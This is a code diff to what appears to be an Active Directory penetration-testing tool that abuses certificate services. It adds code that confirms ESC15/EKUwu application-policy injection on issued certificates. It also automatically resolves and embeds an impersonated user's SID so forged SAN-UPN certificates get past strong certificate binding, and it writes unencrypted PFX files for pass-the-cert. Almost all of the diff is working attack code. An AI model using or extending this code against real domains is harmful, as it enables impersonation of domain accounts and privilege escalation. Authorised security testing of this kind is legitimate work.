@@ -25,14 +25,21 @@ from adscan_core.rich_output import (
 )
 from adscan_core.rich_output import print_exception
 
-# MS-ICPR disposition code for "certificate issued"
+# MS-ICPR disposition codes (MS-WCCE)
+_CR_DISP_DENIED = 2
 _CR_DISP_ISSUED = 3
+_CR_DISP_UNDER_SUBMISSION = 5  # pending — e.g. manager-approval template
 
 # UPN OtherName OID (szOID_NT_PRINCIPAL_NAME)
 _UPN_OID = "1.3.6.1.4.1.311.20.2.3"
 
 # MS AD SID extension OID
 _NTDS_CA_SECURITY_EXT_OID = "1.3.6.1.4.1.311.25.2"
+
+# Application Policies extension OID (szOID_APPLICATION_CERT_POLICIES).
+# ESC15/EKUwu abuses this: the requester injects it into the CSR and an
+# unpatched CA copies it into the issued cert, overriding the template EKU.
+_APP_POLICIES_OID = "1.3.6.1.4.1.311.21.10"
 
 
 # ---------------------------------------------------------------------------
@@ -817,6 +824,16 @@ class CertRequestResult:
             caller that later retrieves the issued cert by ``request_id`` can
             rebuild a usable PFX (cert + key). Without it the retrieved PFX would
             carry the cert only, and PKINIT/pass-the-cert could never sign.
+        issued_eku_oids: ExtendedKeyUsage (OID 2.5.29.37) dotted OIDs read off
+            the issued certificate. Empty when the cert carries no EKU or the
+            request was not issued.
+        issued_application_policy_oids: Application Policies (szOID
+            1.3.6.1.4.1.311.21.10) dotted OIDs read off the issued certificate.
+            This is the ESC15/EKUwu confirmation signal: a canary application
+            policy injected into the CSR that survives into the issued cert
+            proves the CA honours application-policy injection (unpatched).
+            Empty when the extension is absent (hardened/patched CA) or the
+            request was not issued.
     """
 
     success: bool
@@ -830,6 +847,8 @@ class CertRequestResult:
     disposition: Optional[int] = None
     error: Optional[str] = None
     private_key_pem: Optional[bytes] = None
+    issued_eku_oids: list[str] = dc_field(default_factory=list)
+    issued_application_policy_oids: list[str] = dc_field(default_factory=list)
 
 
 # ---------------------------------------------------------------------------
@@ -984,7 +1003,6 @@ def _build_csr(config: CertRequestConfig, key) -> bytes:
     # ESC15: embed application policy OIDs (e.g. enrollment-agent OID) in the CSR.
     # Uses the Application Policies extension OID (szOID_APPLICATION_CERT_POLICIES).
     if config.application_policies:
-        _APP_POLICIES_OID = "1.3.6.1.4.1.311.21.10"
         try:
             from asn1crypto import core as _asn1
 
@@ -1015,6 +1033,65 @@ def _build_csr(config: CertRequestConfig, key) -> bytes:
             "cryptography.hazmat.primitives.serialization", fromlist=["Encoding"]
         ).Encoding.DER
     )
+
+
+def extract_issued_eku_oids(cert: Any) -> list[str]:
+    """Read ExtendedKeyUsage (OID 2.5.29.37) dotted OIDs off an issued cert.
+
+    Best-effort, mirroring the issued-cert SAN parse: returns ``[]`` when the
+    extension is absent or cannot be parsed, so a normal enrollment never breaks.
+
+    Args:
+        cert: A ``cryptography.x509.Certificate`` (the parsed issued cert).
+
+    Returns:
+        The EKU OIDs as dotted strings, in the order the cert carries them.
+    """
+    try:
+        from cryptography.x509.oid import ExtensionOID
+
+        ext = cert.extensions.get_extension_for_oid(ExtensionOID.EXTENDED_KEY_USAGE)
+        return [oid.dotted_string for oid in ext.value]
+    except Exception:
+        return []
+
+
+def extract_issued_application_policy_oids(cert: Any) -> list[str]:
+    """Decode the Application Policies extension off an issued certificate.
+
+    Inverts the ESC15 ENCODER in :func:`_build_csr`. The extension value under
+    ``szOID_APPLICATION_CERT_POLICIES`` (``1.3.6.1.4.1.311.21.10``) is a
+    ``SEQUENCE OF PolicyInformation``, each ``SEQUENCE { policyIdentifier OID }``
+    — the same ASN.1 shape as RFC 5280 ``CertificatePolicies``, so asn1crypto's
+    ``CertificatePolicies`` parses it exactly. ``cryptography`` does not model
+    this Microsoft extension, so it surfaces as an ``UnrecognizedExtension``
+    whose ``.value`` is the raw DER we decode.
+
+    Best-effort (same contract as :func:`extract_issued_eku_oids`): a cert with
+    no such extension, or an unparseable one, yields ``[]``.
+
+    Args:
+        cert: A ``cryptography.x509.Certificate`` (the parsed issued cert).
+
+    Returns:
+        The injected application-policy OIDs as dotted strings.
+    """
+    try:
+        from cryptography import x509 as _cx509
+
+        ext = cert.extensions.get_extension_for_oid(
+            _cx509.ObjectIdentifier(_APP_POLICIES_OID)
+        )
+        raw = ext.value.value  # UnrecognizedExtension.value -> raw DER bytes
+    except Exception:
+        return []
+    try:
+        from asn1crypto.x509 import CertificatePolicies
+
+        parsed = CertificatePolicies.load(raw)
+        return [pi["policy_identifier"].dotted for pi in parsed]
+    except Exception:
+        return []
 
 
 def _build_on_behalf_csr(csr_der: bytes, config: CertRequestConfig) -> bytes:
@@ -1350,6 +1427,11 @@ async def _do_request_certificate(
     except Exception:
         pass
 
+    # Inspect the issued EKU + Application Policies for the ESC15 confirmation
+    # signal (and any application-policy audit). Best-effort, like the SAN parse.
+    issued_eku_oids = extract_issued_eku_oids(cert)
+    issued_application_policy_oids = extract_issued_application_policy_oids(cert)
+
     # Write PFX — unencrypted, matching certipy's default output convention.
     # Downstream tools (`shell.ptc_certipy`, certipy auth) load these without a
     # password.  The PFX lives in the workspace directory whose ACLs gate
@@ -1394,7 +1476,90 @@ async def _do_request_certificate(
         request_id=request_id,
         disposition=disposition,
         private_key_pem=key_pem,
+        issued_eku_oids=issued_eku_oids,
+        issued_application_policy_oids=issued_application_policy_oids,
     )
+
+
+def _impersonation_sid_target(config: CertRequestConfig) -> Optional[str]:
+    """sAMAccountName whose SID must be embedded for a SAN-UPN impersonation, else None.
+
+    Strong Certificate Binding Enforcement (KB5014754, Full) makes a domain
+    controller refuse a PKINIT certificate that impersonates another principal
+    by SAN UPN unless the certificate embeds that principal's SID
+    (``szOID_NTDS_CA_SECURITY_EXT`` via :attr:`CertRequestConfig.sid`). This is
+    the single structural gate deciding whether the shared enrollment seam must
+    resolve and embed that SID, so no ESC enrollment path can forget it. It
+    returns ``None`` (no SID embedded) for every enrollment that must NOT acquire
+    one:
+
+    * ``config.sid`` already supplied by the caller (ESC1/ESC3/ESC13 native embed
+      the target/requester SID themselves) — byte-equivalent no-op.
+    * no SAN-UPN impersonation (``config.upn`` empty) — ESC9/ESC10 enroll a
+      NO_SECURITY_EXTENSION template with no SAN UPN (the implicit-mapping
+      technique; a SID would destroy it), ESC14 strong/weak mappings, and the
+      ESC2/ESC15 agent phase-1 (self-subject) all leave ``upn`` empty.
+    * ``config.on_behalf_of`` set — the enrollment-agent envelope carries the
+      target identity and the CA embeds the target SID from it (ESC2/ESC3/ESC15
+      agent phase 2).
+    * the SAN UPN names the enrolling principal itself — a self-subject
+      enrollment, not an impersonation.
+    """
+    if config.sid:
+        return None
+    upn = (config.upn or "").strip()
+    if not upn:
+        return None
+    if config.on_behalf_of:
+        return None
+    target = upn.split("@", 1)[0].strip()
+    if not target:
+        return None
+    enroller = (config.username or "").strip()
+    if enroller and target.lower() == enroller.lower():
+        return None
+    return target
+
+
+async def _resolve_impersonation_sid(config: CertRequestConfig) -> CertRequestConfig:
+    """Return ``config`` with the impersonated principal's SID embedded, or unchanged.
+
+    Runs at the single enrollment seam (:func:`request_certificate_native`) so
+    every current and future ESC enrollment inherits strong-binding support
+    without threading a ``sid`` through each ``run_escN``. Best-effort: when the
+    SID cannot be resolved (no session shell, lookup miss) the enrollment
+    proceeds WITHOUT it rather than aborting, so a working non-strong-binding
+    path never regresses. The structural exclusions live in
+    :func:`_impersonation_sid_target`.
+    """
+    target = _impersonation_sid_target(config)
+    if target is None:
+        return config
+    shell = config.ledger_shell
+    if shell is None:
+        return config
+    upn = (config.upn or "").strip()
+    realm = upn.split("@", 1)[1].strip() if "@" in upn else ""
+    domain = realm or config.effective_target_domain
+    try:
+        import asyncio
+        from dataclasses import replace
+
+        from adscan_internal.services.attack_graph_service import resolve_user_sid
+
+        sid = await asyncio.to_thread(resolve_user_sid, shell, domain, target)
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        sid = None
+    if sid:
+        from adscan_internal import print_info_debug as _dbg
+
+        _dbg(
+            "adcs sid-embed: embedded impersonated principal SID for strong "
+            "certificate binding (KB5014754)."
+        )
+        return replace(config, sid=sid)
+    return config
 
 
 async def request_certificate_native(
@@ -1411,6 +1576,7 @@ async def request_certificate_native(
         success, or an error message on failure.
     """
     try:
+        config = await _resolve_impersonation_sid(config)
         return await _do_request_certificate(config, output_dir)
     except Exception as exc:
         telemetry.capture_exception(exc)
@@ -1539,6 +1705,8 @@ async def _do_retrieve_certificate(
 
     cert = cx509.load_der_x509_certificate(cert_der)
     cert_serial = f"{cert.serial_number:X}"
+    issued_eku_oids = extract_issued_eku_oids(cert)
+    issued_application_policy_oids = extract_issued_application_policy_oids(cert)
 
     output_dir.mkdir(parents=True, exist_ok=True)
     pfx_name = f"{config.username}_retrieved_{request_id}.pfx"
@@ -1586,6 +1754,8 @@ async def _do_retrieve_certificate(
         request_id=request_id,
         disposition=disposition,
         private_key_pem=private_key_pem,
+        issued_eku_oids=issued_eku_oids,
+        issued_application_policy_oids=issued_application_policy_oids,
     )
 
 
